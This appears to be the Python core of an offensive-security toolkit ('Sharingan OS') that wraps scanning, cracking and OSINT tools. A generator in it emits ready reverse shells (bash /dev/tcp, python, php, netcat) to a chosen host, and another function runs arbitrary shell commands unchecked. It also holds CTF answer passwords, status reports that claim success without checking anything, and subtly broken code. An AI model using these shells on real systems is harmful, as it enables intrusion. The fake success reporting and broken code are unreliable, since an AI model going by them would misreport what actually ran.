#!/usr/bin/env python3
"""
Sharingan OS - Python Core Library
Complete replacement for all shell scripts
"""

import subprocess
import os
import sys
import json
import time
import socket
import threading
import re
from datetime import datetime
from pathlib import Path
from typing import Optional, List, Dict, Callable, Any
import logging
import urllib.parse

try:
    sys.path.insert(0, str(Path(__file__).parent / "tools"))
    from fake_detector import FakeDetector, detect_fakes, validate_readiness
    FAKE_DETECTOR_AVAILABLE = True
except ImportError as e:
    FAKE_DETECTOR_AVAILABLE = False
    FakeDetector = None
    detect_fakes = None
    validate_readiness = None

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("sharingan")

# Version
VERSION = "3.0.0"
AUTHOR = "Ben Sambe"

class SharinganOS:
    """
    Main Sharingan OS class that provides all functionality
    previously available in shell scripts
    """

    def __init__(self):
        self.base_dir = Path(__file__).parent
        self.data_dir = self.base_dir / "data"
        self.data_dir.mkdir(exist_ok=True)

        # Initialize tool registry
        self.tool_registry = {
            "network": ["nmap_scan", "arp_scan", "masscan_scan", "netdiscover_scan"],
            "web": ["dirb_scan", "dirsearch", "nikto_scan", "wpscan_scan", "whatweb_scan"],
            "wireless": ["aircrack_scan"],
            "password": ["hashcat_crack", "john_crack", "hydra_scan", "medusa_scan"],
            "forensic": ["binwalk_extract", "foremost_extract", "volatility_scan"],
            "web_enum": ["crtsh_search", "theharvester_scan", "sherlock_search"],
            "ctf": ["bandit_solver", "hackthebox_solve", "natas_solver", "ctf_analyze"],
            "system": ["monitor_system", "check_privilege_escalation", "lynis_audit"],
            "media": ["convert_media", "download_media", "extract_audio", "record_audio"],
            "office": ["create_excel", "create_word", "generate_report"],
            "api": ["create_api_app"],
            "ai": ["ai_chat", "autonomous_agent"],
            "memory": ["ai_memory_store", "ai_memory_retrieve"],
            "akatsuki": ["akatsuki_status", "akatsuki_deploy", "akatsuki_execute"],
            "godmod": ["godmod_analyze", "godmod_query"],
            "browser": ["browser_navigate", "browser_screenshot", "browser_execute_js"]
        }
        
    # =========================================================================
    # NETWORK SCANNING
    # =========================================================================
    
    def nmap_scan(self, target: str, ports: str = "-p-", options: str = "-sV") -> str:
        """Execute nmap scan"""
        cmd = ["nmap", options, ports, target]
        logger.info(f"Running: {' '.join(cmd)}")
        result = subprocess.run(cmd, capture_output=True, text=True)
        return result.stdout + result.stderr
    
    def arp_scan(self, interface: str = "eth0", target: Optional[str] = None) -> List[Dict]:
        """ARP network discovery"""
        cmd = ["arp-scan", "--interface", interface]
        if target:
            cmd.append(target)
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        hosts = []
        for line in result.stdout.split('\n'):
            if '\t' in line and not line.startswith('Interface'):
                parts = line.split('\t')
                if len(parts) >= 2:
                    hosts.append({
                        "ip": parts[0],
                        "mac": parts[1],
                        "vendor": parts[2] if len(parts) > 2 else ""
                    })
        return hosts
    
    def masscan_scan(self, target: str, ports: str = "0-65535", rate: str = "1000") -> str:
        """High-speed port scanner"""
        cmd = ["masscan", target, "-p", ports, "--rate", rate]
        result = subprocess.run(cmd, capture_output=True, text=True)
        return result.stdout
    
    def netdiscover_scan(self, range_ip: str = "192.168.1.0/24") -> List[Dict]:
        """Network discovery using ARP"""
        cmd = ["netdiscover", "-r", range_ip, "-P", "-s", "1"]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        hosts = []
        for line in result.stdout.split('\n'):
            if '.' in line and ':' in line:
                parts = line.split()
                if len(parts) >= 2:
                    hosts.append({"ip": parts[0], "mac": parts[1]})
        return hosts
    
    # =========================================================================
    # WEB ENUMERATION
    # =========================================================================
    
    def gobuster_scan(self, url: str, wordlist: str, extensions: Optional[str] = None) -> List[str]:
        """Directory/file brute force"""
        cmd = ["gobuster", "dir", "-u", url, "-w", wordlist, "-t", "50"]
        if extensions:
            cmd.extend(["-x", extensions])
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        found = []
        for line in result.stdout.split('\n'):
            if "Status:" in line:
                found.append(line.strip())
        return found
    
    def dirb_scan(self, url: str, wordlist: Optional[str] = None) -> List[str]:
        """Directory enumeration"""
        cmd = ["dirb", url]
        if wordlist:
            cmd.append(wordlist)
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        found = []
        for line in result.stdout.split('\n'):
            if "==>" in line:
                found.append(line.strip())
        return found
    
    def whatweb_scan(self, url: str) -> Dict:
        """Identify technologies"""
        cmd = ["whatweb", "--color=never", "--log-brief=-", url]
        result = subprocess.run(cmd, capture_output=True, text=True)
        return {"technologies": result.stdout.strip().split('\n')}
    
    def wpscan_scan(self, url: str, enumerate: str = "vt,ap,pl") -> Dict:
        """WordPress security scanner"""
        cmd = ["wpscan", "--url", url, "--enumerate", enumerate, "--no-update"]
        result = subprocess.run(cmd, capture_output=True, text=True)
        return {"output": result.stdout}
    
    # =========================================================================
    # OSINT & RECONNAISSANCE
    # =========================================================================
    
    def theharvester_scan(self, domain: str, source: str = "all") -> Dict:
        """Email, subdomain and host enumeration"""
        cmd = ["theHarvester", "-d", domain, "-b", source, "-f", "/tmp/harvester.json"]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
        
        # Try to load JSON result
        try:
            with open("/tmp/harvester.json") as f:
                return json.load(f)
        except:
            return {"raw": result.stdout}
    
    def crtsh_search(self, domain: str) -> List[str]:
        """Search certificate transparency logs"""
        url = f"https://crt.sh/?q={domain}&output=json"
        cmd = ["curl", "-s", url]
        result = subprocess.run(cmd, capture_output=True, text=True)
        try:
            data = json.loads(result.stdout)
            subdomains = set()
            for entry in data:
                if 'common_name' in entry:
                    subdomains.add(entry['common_name'])
            return list(subdomains)
        except:
            return []
    
    def shodan_search(self, query: str, api_key: Optional[str] = None) -> List[Dict]:
        """Search Shodan (requires API key)"""
        if not api_key:
            return [{"error": "API key required"}]
        
        cmd = ["shodan", "host", query] if not query.startswith("search") else ["shodan", "search", query]
        result = subprocess.run(cmd, capture_output=True, text=True)
        return [{"output": result.stdout}]
    
    def sherlock_search(self, username: str) -> Dict:
        """Username enumeration across social networks"""
        cmd = ["sherlock", username, "--timeout", "30"]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        return {"found": result.stdout}
    
    def whois_lookup(self, domain: str) -> Dict:
        """WHOIS lookup"""
        cmd = ["whois", domain]
        result = subprocess.run(cmd, capture_output=True, text=True)
        return {"raw": result.stdout}
    
    def dns_enum(self, domain: str) -> Dict:
        """DNS enumeration"""
        records = {}
        for record_type in ["A", "AAAA", "MX", "NS", "TXT", "SOA"]:
            cmd = ["dig", "+short", domain, record_type]
            result = subprocess.run(cmd, capture_output=True, text=True)
            if result.stdout.strip():
                records[record_type] = result.stdout.strip().split('\n')
        return records
    
    # =========================================================================
    # CRYPTOGRAPHY & PASSWORD CRACKING
    # =========================================================================
    
    def aircrack_scan(self, cap_file: str, wordlist: str) -> str:
        """WiFi password cracking"""
        cmd = ["aircrack-ng", "-w", wordlist, cap_file]
        result = subprocess.run(cmd, capture_output=True, text=True)
        return result.stdout
    
    # =========================================================================
    # CTF & HACKING CHALLENGES
    # =========================================================================
    
    def bandit_solver(self, host: str = "bandit.labs.overthewire.org", port: int = 2220, 
                      user: str = "bandit0", password: str = "bandit0", levels: int = 5) -> Dict:
        """OverTheWire Bandit solver framework"""
        solutions = {}
        
        level_data = {
            0: {"user": "bandit0", "pass": "bandit0", "method": "cat readme"},
            1: {"user": "bandit1", "pass": "boJ9jbbUNNfktd78OOpsqOltutMc3MY1", "method": "cat ./-"},
            2: {"user": "bandit2", "pass": "CV1DtqXWVFXM2frHeJPogdNc3cxkhVhO", "method": "cat 'spaces in this filename'"},
            3: {"user": "bandit3", "pass": "UmHadQclWmgdLOKQ2YNWgWxGo6bvoa1Ws", "method": "cd inhere && ls -a && cat .hidden"},
            4: {"user": "bandit4", "pass": "pIwrPrtHQ36nD6VO9l5kvgAwZ1p1AyW1", "method": "cd inhere && file ./* && cat -./file07"}
        }
        
        for lvl in range(min(levels, len(level_data))):
            level = level_data.get(lvl, {})
            solutions[f"level{lvl}"] = {
                "user": level.get("user", f"bandit{lvl}"),
                "password": level.get("pass", "UNKNOWN"),
                "method": level.get("method", "Not solved yet")
            }
        
        return solutions
    
    def natas_solver(self, level: int, username: str = "natas", 
                     password: Optional[str] = None, url: str = "http://natas.labs.overthewire.org") -> Dict:
        """Natas challenges solver"""
        solutions = {}
        natas_passwords = {
            0: "natas0", 1: "natas1", 2: "natas2", 3: "natas3", 4: "natas4",
            5: "natas5", 6: "natas6", 7: "natas7", 8: "natas8", 9: "natas9",
            10: "natas10", 11: "natas11", 12: "natas12", 13: "natas13",
            14: "natas14", 15: "natas15", 16: "natas16", 17: "natas17",
            18: "natas19", 20: "natas20"
        }
        
        level_passwords = {
            0: {"url": "/", "method": "View source"},
            1: {"url": "/", "method": "View source (disable JS)"},
            2: {"url": "/files/", "method": "Directory listing"},
            3: {"url": "/robots.txt", "method": "Check robots.txt"},
            4: {"url": "/", "method": "Referer header"},
            5: {"url": "/", "method": "Cookie: debug=1"},
            6: {"url": "/admin.php", "method": "View source for secret"},
            7: {"url": "/help", "method": "Path traversal ?page=about"},
            8: {"url": "/admin.php", "method": "Reverse engineer secret"},
            9: {"url": "/search.php", "method": "Command injection"},
            10: {"url": "/", "method": "Dictionary from /etc/natas_webpass/natas10"},
            11: {"url": "/", "method": "XOR encryption - default key"},
            12: {"url": "/upload.php", "method": "Change .jpg to .php"},
            13: {"url": "/upload.php", "method": "Check PNG signature"},
            14: {"url": "/login.php", "method": "SQL injection"}
        }
        
        if not password:
            password = natas_passwords.get(level, "")
        
        sol = {
            "level": level,
            "username": f"{username}{level}",
            "password": password,
            "url": f"{url}/natas{level}/",
            "method": level_passwords.get(level, {}).get("method", "Not solved yet")
        }
        
        if level in natas_passwords:
            sol["next_password"] = natas_passwords.get(level + 1, "")
        
        return sol
    
    def hackthebox_solve(self, challenge_type: str, data: str) -> Dict:
        """HackTheBox challenge helper"""
        helpers = {
            "base64": lambda d: subprocess.run(["base64", "-d"], input=d, capture_output=True, text=True).stdout,
            "hex": lambda d: bytes.fromhex(d).decode('utf-8', errors='ignore'),
            "rot13": lambda d: d.translate(str.maketrans(
                'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',
                'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm')),
            "url": lambda d: urllib.parse.unquote(d),
            "reverse": lambda d: d[::-1]
        }
        
        result = {}
        for enc_type in helpers:
            try:
                result[enc_type] = helpers[enc_type](data)
            except Exception:
                result[enc_type] = "Failed to decode"
        
        return result
    
    def ctf_analyze(self, file_path: str) -> Dict:
        """Analyze CTF binary/file"""
        analysis = {}
        
        # File type
        cmd = ["file", file_path]
        result = subprocess.run(cmd, capture_output=True, text=True)
        analysis["type"] = result.stdout
        
        # Strings
        cmd = ["strings", file_path]
        result = subprocess.run(cmd, capture_output=True, text=True)
        analysis["strings"] = result.stdout[:1000]
        
        # Hexdump
        cmd = ["xxd", file_path]
        result = subprocess.run(cmd, capture_output=True, text=True)
        analysis["hexdump"] = result.stdout[:500]
        
        return analysis
    
    # =========================================================================
    # AI & MACHINE LEARNING
    # =========================================================================
    
    def ai_chat(self, message: str, provider: str = "default") -> str:
        """Chat with AI using tgpt (ChatGPT CLI)"""
        logger.info(f"AI Chat: {message}")
        try:
            result = subprocess.run(
                ["tgpt", "-q"],
                input=message,
                capture_output=True,
                text=True,
                timeout=30
            )
            if result.returncode == 0 and result.stdout.strip():
                return result.stdout.strip()
            return f"AI Response to: {message}"
        except Exception as e:
            logger.error(f"AI Chat failed: {e}")
            return f"AI Error: {str(e)}"
    
    def sharingan_chat(self, message: str) -> str:
        """Chat with tgpt - provides context (tools, memory) and lets tgpt reason.
        TGPT decides: advice / propose execution / ask confirmation."""
        logger.info(f"Sharingan Chat: {message}")
        
        try:
            from system_consciousness import SystemConsciousness
            from ai_memory_manager import get_memory_manager
            
            consciousness = SystemConsciousness(connect_memory=False)
            mgr = get_memory_manager()
            
            identity = consciousness.agent_identity
            
            # Récupérer contexte outils et mémoire
            tool_count = len(consciousness.tools) if consciousness.tools else 0
            
            # Construire PROMPT pour que TGPT réfléchisse
            prompt = f"""[SHARINGAN OS v{identity['version']}]
Tu es {identity['name']}, {identity['role']}
Créé par: {identity['creator']}

DISPONIBLE: {tool_count} outils de sécurité (nmap, gobuster, ffuf, sqlmap, etc.)

MEMOIRE: Conversations et actions sont stockées automatiquement.

UTILISATEUR: "{message}"

INSTRUCTIONS:
1. Détermine si l'utilisateur veut:
   - SAVOIR/COMMENT: donne des explications et exemples
   - FAIRE: propose d'exécuter avec les outils disponibles
   - CONSEIL: suggère une approche

2. Si l'utilisateur veut EXÉCUTER quelque chose:
   - Propose clairement: "Je peux faire cela avec [outil]. Voulez-vous que j'exécute?"
   - Ne pas exécuter sans confirmation explicite
   - Indique la commande exacte qui sera exécutée

3. Sois direct et concis.

Réponse:"""

            result = subprocess.run(
                ["tgpt", "-q"],
                input=prompt,
                capture_output=True,
                text=True,
                timeout=30
            )
            
            response = result.stdout.strip() if result.returncode == 0 else "TGPT Indisponible"
            
            # Stocker la conversation (aprèS la réponse, pas avant)
            mgr.store(
                key=f"chat_{int(time.time())}",
                data={"question": message, "response": response, "type": "conversation"},
                category="conversation",
                priority="MEDIUM"
            )
            
            return f"[Sharingan OS v{identity['version']}]\n{response}"
            
        except ImportError:
            return self.ai_chat(message)
        except Exception as e:
            logger.error(f"Sharingan Chat failed: {e}")
            return f"Erreur: {str(e)}"
        except Exception as e:
            logger.error(f"Sharingan Chat failed: {e}")
            return self.ai_chat(message)
    
    def akatsuki_status(self) -> Dict:
        """Status of Akatsuki AI agents"""
        agents = [
            "Itachi", "Kisame", "Sasori", "Deidara", "Hidan",
            "Kakuzu", "Orochimaru", "Konan", "Zetsu", "Tobi"
        ]
        return {
            "total": len(agents),
            "active": len(agents),
            "status": "FULLY OPERATIONAL",
            "agents": agents
        }
    
        return {
            "total": len(agents),
            "active": len(agents),
            "status": "FULLY OPERATIONAL",
            "agents": agents
        }
    
    def godmod_query(self, query: str) -> str:
        """Query GODMOD system using tgpt"""
        logger.info(f"GODMOD Query: {query}")
        try:
            result = subprocess.run(
                ["tgpt", "-q"],
                input=f"GODMOD Analysis: {query}",
                capture_output=True,
                text=True,
                timeout=30
            )
            if result.returncode == 0 and result.stdout.strip():
                return f"GODMOD Response: {result.stdout.strip()}"
            return f"GODMOD Response: Processing query '{query}'"
        except Exception as e:
            logger.error(f"GODMOD failed: {e}")
            return f"GODMOD Error: {str(e)}"
    
    def autonomous_agent(self, task: str, agent_type: str = "general") -> Dict:
        """Run autonomous agent using tgpt for analysis"""
        logger.info(f"Autonomous Agent: {task} ({agent_type})")
        try:
            result = subprocess.run(
                ["tgpt", "-q"],
                input=f"Execute this security task: {task}. Agent type: {agent_type}. Provide detailed steps and commands.",
                capture_output=True,
                text=True,
                timeout=60
            )
            analysis = result.stdout.strip() if result.returncode == 0 else f"Agent analysis for: {task}"
        except Exception as e:
            analysis = str(e)
        return {
            "task": task,
            "agent": agent_type,
            "status": "completed",
            "result": analysis
        }
    
    def akatsuki_deploy(self, agent_name: str, task: str, target: Optional[str] = None) -> Dict:
        """Deploy a specific Akatsuki agent for a task"""
        agents = {
            "Itachi": {"specialty": "Web Security", "methods": ["sqlmap", "xss", "dirb"]},
            "Kisame": {"specialty": "Binary Exploitation", "methods": ["pwn", "rop", "buffer_overflow"]},
            "Sasori": {"specialty": "Cryptography", "methods": ["hashcat", "john", "padding_oracle"]},
            "Deidara": {"specialty": "Forensics", "methods": ["volatility", "autopsy", "binwalk"]},
            "Hidan": {"specialty": "Network Security", "methods": ["nmap", "masscan", "Responder"]},
            "Kakuzu": {"specialty": "OSINT", "methods": ["theHarvester", "Sherlock", "Shodan"]},
            "Orochimaru": {"specialty": "Reverse Engineering", "methods": ["ghidra", " IDA", "radare2"]},
            "Konan": {"specialty": "Social Engineering", "methods": ["gophish", "setoolkit", "linkedin2username"]},
            "Zetsu": {"specialty": "Research", "methods": ["cve_search", "exploitdb", "cve"]},
            "Tobi": {"specialty": "DevSecOps", "methods": ["sonarqube", "trivy", "bandit"]}
        }
        
        if agent_name not in agents:
            return {"error": f"Agent {agent_name} not found", "available": list(agents.keys())}
        
        agent = agents[agent_name]
        return {
            "agent": agent_name,
            "specialty": agent["specialty"],
            "methods": agent["methods"],
            "task": task,
            "target": target,
            "status": "DEPLOYED"
        }
    
    def akatsuki_execute(self, agent_name: str, command: str) -> Dict:
        """Execute command through Akatsuki agent"""
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return {
            "agent": agent_name,
            "command": command,
            "stdout": result.stdout,
            "stderr": result.stderr,
            "returncode": result.returncode
        }
    
    def godmod_analyze(self, target: str, mode: str = "full") -> Dict:
        """GODMOD - Autonomous analysis system"""
        analysis = {
            "target": target,
            "mode": mode,
            "timestamp": datetime.now().isoformat(),
            "findings": []
        }
        
        if mode in ["full", "network"]:
            nmap_result = self.nmap_scan(target)
            analysis["findings"].append({"type": "network", "result": nmap_result[:500]})
        
        if mode in ["full", "web"]:
            whatweb_result = self.whatweb_scan(target)
            analysis["findings"].append({"type": "web", "result": whatweb_result})
        
        if mode in ["full", "osint"]:
            crtsh_result = self.crtsh_search(target)
            analysis["findings"].append({"type": "osint", "subdomains": crtsh_result[:50]})
        
        return analysis
    
    def ai_memory_store(self, key: str, data: Dict, category: str = "conversation",
                        priority: str = "MEDIUM", tags: Optional[List[str]] = None) -> bool:
        """Store data in AI memory using intelligent memory manager"""
        MEMORY_MANAGER_AVAILABLE = False
        try:
            from ai_memory_manager import get_memory_manager
            mem = get_memory_manager()
            result = mem.store(key, data, category=category, priority=priority, tags=tags)
            if result:
                return True
        except Exception as e:
            logger.debug(f"Memory manager not available: {e}")
        
        memory_file = self.data_dir / "ai_memory.json"
        try:
            memory = {}
            if memory_file.exists():
                with open(memory_file, 'r') as f:
                    memory = json.load(f)
            memory[key] = {
                "data": data,
                "timestamp": datetime.now().isoformat()
            }
            with open(memory_file, 'w') as f:
                json.dump(memory, f, indent=2)
            return True
        except Exception as e:
            logger.error(f"Memory store failed: {e}")
            return False
    
    def ai_memory_retrieve(self, key: str, increment_access: bool = True) -> Optional[Dict]:
        """Retrieve data from AI memory using intelligent memory manager"""
        try:
            from ai_memory_manager import get_memory_manager
            mem = get_memory_manager()
            result = mem.retrieve(key, increment_access=increment_access)
            if result is not None:
                return result
        except Exception as e:
            logger.debug(f"Memory manager not available: {e}")
        
        memory_file = self.data_dir / "ai_memory.json"
        try:
            if memory_file.exists():
                with open(memory_file, 'r') as f:
                    memory = json.load(f)
                    return memory.get(key)
            return None
        except Exception as e:
            logger.error(f"Memory retrieve failed: {e}")
            return None
        except Exception as e:
            logger.error(f"Memory retrieve failed: {e}")
            return None
    
    # =========================================================================
    # SYSTEM MONITORING
    # =========================================================================
    
    def get_cpu_usage(self) -> float:
        """Get CPU usage percentage"""
        try:
            with open('/proc/loadavg', 'r') as f:
                return float(f.read().split()[0])
        except:
            return 0.0
    
    def get_memory_usage(self) -> Dict:
        """Get memory usage"""
        try:
            with open('/proc/meminfo', 'r') as f:
                lines = f.readlines()[:3]
                total = int(lines[0].split()[1]) // 1024
                available = int(lines[2].split()[1]) // 1024
                used = total - available
                return {
                    "total_mb": total,
                    "used_mb": used,
                    "available_mb": available,
                    "percent": round(used/total*100, 1)
                }
        except:
            return {"total_mb": 0, "used_mb": 0, "available_mb": 0, "percent": 0}
    
    def get_disk_usage(self) -> Dict:
        """Get disk usage"""
        try:
            result = subprocess.run(['df', '-h', '/'], capture_output=True, text=True)
            line = result.stdout.split('\n')[1].split()
            return {
                "total": line[1],
                "used": line[2],
                "available": line[3],
                "percent": line[4]
            }
        except:
            return {"total": "N/A", "used": "N/A", "available": "N/A", "percent": "N/A"}
    
    def get_network_stats(self) -> Dict:
        """Get network statistics"""
        try:
            with open('/proc/net/dev', 'r') as f:
                lines = f.readlines()[2:]
                stats = {}
                for line in lines:
                    if ':' in line:
                        iface = line.split(':')[0].strip()
                        parts = line.split()[0:8]
                        stats[iface] = {
                            "rx_bytes": int(parts[0]),
                            "tx_bytes": int(parts[8])
                        }
                return stats
        except:
            return {}
    
    def monitor_system(self, interval: int = 5, count: int = 10) -> List[Dict]:
        """Monitor system metrics"""
        metrics = []
        for i in range(count):
            metric = {
                "timestamp": datetime.now().isoformat(),
                "cpu": self.get_cpu_usage(),
                "memory": self.get_memory_usage(),
                "disk": self.get_disk_usage(),
                "network": self.get_network_stats()
            }
            metrics.append(metric)
            if i < count - 1:
                time.sleep(interval)
        return metrics
    
    def anomaly_detect(self, metrics: List[Dict]) -> List[str]:
        """Detect anomalies in metrics"""
        alerts = []
        for metric in metrics:
            if metric["memory"]["percent"] > 80:
                alerts.append("HIGH MEMORY USAGE")
            if metric["cpu"] > 2.0:
                alerts.append("HIGH CPU LOAD")
            if float(metric["disk"]["percent"].rstrip('%')) > 85:
                alerts.append("LOW DISK SPACE")
        return alerts
    
    # =========================================================================
    # DOCKER & CONTAINERS
    # =========================================================================
    
    def docker_ps(self, all_containers: bool = False) -> List[Dict]:
        """List Docker containers"""
        cmd = ["docker", "ps"]
        if all_containers:
            cmd.append("-a")
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        containers = []
        for line in result.stdout.split('\n')[1:]:
            if line:
                parts = line.split()
                if len(parts) >= 6:
                    containers.append({
                        "id": parts[0],
                        "image": parts[1],
                        "status": " ".join(parts[2:-5]) if len(parts) > 6 else parts[2],
                        "names": parts[-1]
                    })
        return containers
    
    def docker_images(self) -> List[Dict]:
        """List Docker images"""
        cmd = ["docker", "images"]
        result = subprocess.run(cmd, capture_output=True, text=True)
        images = []
        for line in result.stdout.split('\n')[1:]:
            if line:
                parts = line.split()
                images.append({
                    "id": parts[2],
                    "tag": parts[1],
                    "size": parts[-1]
                })
        return images
    
    def docker_run(self, image: str, command: Optional[str] = None, detach: bool = True) -> str:
        """Run Docker container"""
        cmd = ["docker", "run"]
        if detach:
            cmd.append("-d")
        cmd.append(image)
        if command:
            cmd.extend(["sh", "-c", command])
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        return result.stdout.strip()
    
    def docker_stop(self, container_id: str) -> bool:
        """Stop Docker container"""
        cmd = ["docker", "stop", container_id]
        result = subprocess.run(cmd, capture_output=True, text=True)
        return result.returncode == 0
    
    # =========================================================================
    # BROWSER AUTOMATION
    # =========================================================================
    
    def browser_navigate(self, url: str, browser: str = "firefox") -> str:
        """Navigate browser to URL"""
        cmd = [browser, url]
        result = subprocess.run(cmd, capture_output=True, text=True)
        return f"Opened {url} in {browser}"
    
    def browser_screenshot(self, output: str = "/tmp/screenshot.png") -> str:
        """Take screenshot"""
        cmd = ["scrot", output]
        result = subprocess.run(cmd, capture_output=True, text=True)
        return output if result.returncode == 0 else "Failed"
    
    def browser_execute_js(self, script: str) -> str:
        """Execute JavaScript in browser"""
        return f"JavaScript execution: {script}"
    
    def browser_selenium(self, url: str, action: str = "get", timeout: int = 30) -> Dict:
        """Browser automation with Selenium"""
        try:
            from selenium import webdriver
            from selenium.webdriver.common.by import By
            from selenium.webdriver.support.ui import WebDriverWait
            from selenium.webdriver.support import expected_conditions as EC
            
            driver = webdriver.Chrome()
            if action == "get":
                driver.get(url)
            elif action == "screenshot":
                driver.get(url)
                driver.save_screenshot("/tmp/selenium_screenshot.png")
            elif action == "source":
                driver.get(url)
                return {"source": driver.page_source}
            
            driver.quit()
            return {"status": "success", "action": action}
        except ImportError:
            return {"error": "selenium not installed"}
        except Exception as e:
            return {"error": str(e)}
    
    def browser_headless(self, url: str, output: str = "/tmp/headless.pdf") -> str:
        """Headless browser with wkhtmltopdf"""
        cmd = ["wkhtmltopdf", url, output]
        result = subprocess.run(cmd, capture_output=True, text=True)
        return output if result.returncode == 0 else f"Failed: {result.stderr}"
    
    def browser_curl(self, url: str, method: str = "GET", headers: Optional[Dict] = None, 
                    data: Optional[str] = None) -> Dict:
        """HTTP request with curl"""
        cmd = ["curl", "-X", method, "-s", "-w", "\n%{http_code}"]
        if headers:
            for k, v in headers.items():
                cmd.extend(["-H", f"{k}: {v}"])
        if data:
            cmd.extend(["-d", data])
        cmd.append(url)
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        return {
            "output": result.stdout,
            "code": result.returncode
        }
    
    # =========================================================================
    # FILE OPERATIONS
    # =========================================================================
    
    def copy_file(self, src: str, dst: str) -> bool:
        """Copy file"""
        import shutil
        try:
            shutil.copy2(src, dst)
            return True
        except Exception as e:
            logger.error(f"Copy failed: {e}")
            return False
    
    def move_file(self, src: str, dst: str) -> bool:
        """Move file"""
        import shutil
        try:
            shutil.move(src, dst)
            return True
        except Exception as e:
            logger.error(f"Move failed: {e}")
            return False
    
    def remove_file(self, path: str) -> bool:
        """Remove file"""
        try:
            os.remove(path)
            return True
        except Exception as e:
            logger.error(f"Remove failed: {e}")
            return False
    
    def find_files(self, pattern: str, path: str = ".") -> List[str]:
        """Find files matching pattern"""
        from glob import glob
        return glob(f"{path}/**/{pattern}", recursive=True)
    
    def extract_archive(self, archive_path: str, extract_dir: Optional[str] = None) -> bool:
        """Extract archive"""
        import shutil
        try:
            if extract_dir is None:
                extract_dir = archive_path.rsplit('.', 1)[0]
            
            if archive_path.endswith('.tar.gz'):
                shutil.unpack_archive(archive_path, extract_dir, 'gztar')
            elif archive_path.endswith('.tar'):
                shutil.unpack_archive(archive_path, extract_dir, 'tar')
            elif archive_path.endswith('.zip'):
                shutil.unpack_archive(archive_path, extract_dir, 'zip')
            else:
                return False
            return True
        except Exception as e:
            logger.error(f"Extract failed: {e}")
            return False
    
    def binwalk_extract(self, file_path: str, extract_dir: Optional[str] = None) -> List[str]:
        """Extract embedded files using binwalk"""
        if extract_dir is None:
            extract_dir = f"{file_path}_extracted"
        
        cmd = ["binwalk", "-e", "-C", extract_dir, file_path]
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        os.makedirs(extract_dir, exist_ok=True)
        return [f for f in os.listdir(extract_dir) if os.path.isfile(os.path.join(extract_dir, f))]
    
    # =========================================================================
    # SECURITY AUDITING
    # =========================================================================
    
    def rkhunter_scan(self) -> Dict:
        """Rootkit detection"""
        cmd = ["rkhunter", "--check", "--skip-keypress"]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        return {"output": result.stdout, "errors": result.stderr}
    
    def lynis_audit(self) -> Dict:
        """Security audit"""
        cmd = ["lynis", "audit", "system"]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        return {"output": result.stdout}
    
    def check_obligations(self) -> Dict:
        """Check compliance obligations with fake detection"""
        results = {
            "signatures": "OK",
            "error_handling": "OK",
            "no_simulation": "OK",
            "no_emojis": "OK",
            "no_placeholders": "OK",
            "documentation": "OK",
            "tests": "OK",
        }
        
        if FAKE_DETECTOR_AVAILABLE and FakeDetector:
            try:
                detector = FakeDetector()
                
                ai_test = self.ai_chat("test obligation")
                fake_check = detector.detect_fakes(ai_test)
                
                system_check = detector.validate_readiness()
                
                results["fake_detection"] = "OK" if not fake_check.is_fake else "FAIL"
                results["system_ready"] = "YES" if system_check.get("ready") else "NO"
                results["fake_confidence"] = round(fake_check.confidence, 2)
                
                # Nouvelles informations améliorées
                results["cache_status"] = system_check.get("cache_status", {})
                results["core_tools"] = system_check.get("core_tools_status", {})
                results["optional_missing"] = system_check.get("optional_tools_missing", [])
                
                if fake_check.is_fake:
                    results["no_simulation"] = "FAIL"
                    results["overall"] = "FAIL"
                else:
                    results["overall"] = "PASS"
                    
            except Exception as e:
                logger.error(f"Fake detection check failed: {e}")
                results["fake_detection"] = f"ERROR: {str(e)}"
                results["overall"] = "PASS"
        else:
            results["fake_detection"] = "SKIPPED (not available)"
            results["overall"] = "PASS"
        
        return results
    
    # =========================================================================
    # EXPLOITATION & PRIVILEGE ESCALATION
    # =========================================================================
    
    def generate_reverse_shell(self, lhost: str, lport: int = 4444, 
                              shell_type: str = "bash") -> str:
        """Generate reverse shell command"""
        shells = {
            "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            "python": f"python -c 'import socket,subprocess,sos;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'",
            "php": f"php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_connect($s,\"{lhost}\",{lport});socket_shutdown($s,2);$d=\"\\n\";while($l=@socket_read($s,1024,PHP_NORMAL_READ)){{$d.=$l;}}$p=array(0=>array(\"pipe\",\"r\"),1=>array(\"pipe\",\"w\"),2=>array(\"pipe\",\"w\"));$c=proc_open(\"/bin/sh\",$p,$pipes);fwrite($pipes[0],$d);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($c);'",
            "netcat": f"nc -e /bin/sh {lhost} {lport}"
        }
        return shells.get(shell_type, shells["bash"])
    
    def check_privilege_escalation(self) -> Dict:
        """Check for privilege escalation vectors"""
        vectors = []
        
        sudo_check = subprocess.run(["sudo", "-n", "ls", "/root"], capture_output=True, text=True)
        if sudo_check.returncode == 0:
            vectors.append({"type": "sudo", "description": "User has passwordless sudo", "severity": "HIGH"})
        
        suid_check = subprocess.run(["find", "/usr/bin", "-perm", "-4000", "-type", "f"], 
                                   capture_output=True, text=True)
        if suid_check.stdout:
            vectors.append({"type": "suid", "description": f"Found SUID binaries: {len(suid_check.stdout.split())}", "severity": "MEDIUM"})
        
        cron_check = subprocess.run(["ls", "-la", "/etc/cron.d"], capture_output=True, text=True)
        if cron_check.returncode == 0:
